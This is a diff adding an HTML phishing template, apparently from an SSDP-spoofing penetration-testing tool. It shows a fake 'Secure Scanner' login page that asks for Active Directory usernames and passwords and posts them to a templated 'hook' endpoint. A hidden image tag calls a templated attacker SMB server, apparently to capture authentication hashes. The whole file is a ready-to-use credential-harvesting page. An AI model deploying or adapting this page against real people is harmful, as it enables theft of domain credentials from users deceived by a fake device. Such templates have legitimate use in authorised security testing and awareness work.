@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Scanner - Login</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div id="login">
+    <div id="triangle"></div>
+    <h1>Log in</h1>
+    <h2>You have [3] scans waiting</h2>
+    <h3>Please enter your Active Directory username and password</h3>
+    <form method="POST" action="/ssdp/{{ template_idx }}/hook.html" name="LoginForm">
+      <input type="username" name="username" placeholder="Username" />
+      <input type="password" name="password" placeholder="Password" />
+      <input type="submit" value="Log in" />
+    </form>
+  </div>
+  <img src="http://{{ smb_server }}" style="display: none;" />
+</body>
+</html>
